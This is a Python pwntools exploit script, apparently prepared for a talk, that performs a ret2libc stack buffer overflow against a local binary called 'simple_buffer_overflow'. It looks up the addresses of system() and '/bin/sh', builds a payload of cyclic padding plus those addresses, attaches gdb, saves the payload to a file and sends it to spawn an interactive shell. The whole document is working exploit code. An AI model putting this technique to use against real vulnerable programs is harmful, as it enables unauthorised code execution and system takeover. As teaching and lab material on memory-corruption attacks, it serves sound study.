# take filename as argument
# take desired fn name as argument
# take sequence length as arg default 50
import argparse
from pwn import *

simple_elf=ELF("simple_buffer_overflow")
libc_system=simple_elf.symbols["system"]
print(p32(libc_system))
print(libc_system)


libc=ELF("/lib32/libc.so.6")
bin_sh=next(libc.search(b"/bin/sh"))
print(p32(bin_sh))
print(bin_sh)

parser = argparse.ArgumentParser()
parser.add_argument("exe", help="Executable name")

args = parser.parse_args()
exe = args.exe

# second round with offset from ip
smashoffset = 62#cyclic_find(user_input)
print("smashoffset: ", smashoffset)
g=cyclic_gen()

sh = process(exe)
gdb_smash = gdb.attach(
sh,
gdbscript='break *0x080491b1', 
)


fake_return_address=0xdeadbeef

# this and system should be calculated from offset
# but bear in mind that this might be already enough for tektalk
# dont have to hack the world at once
user_input_bin = input("enter address of bin sh in hex, use grep /bin/sh and copy \n")
bin_sh_address=int(user_input_bin,16)

smasher = g.get(smashoffset) + p32(libc_system) + p32(fake_return_address) + p32(bin_sh_address)
print("Trying to smash stack with: ", smasher, "length: ", smashoffset)

with open('payload.txt', 'wb') as fw:
    fw.write(smasher)

sh.sendline(smasher)
sh.interactive()
sh.close()
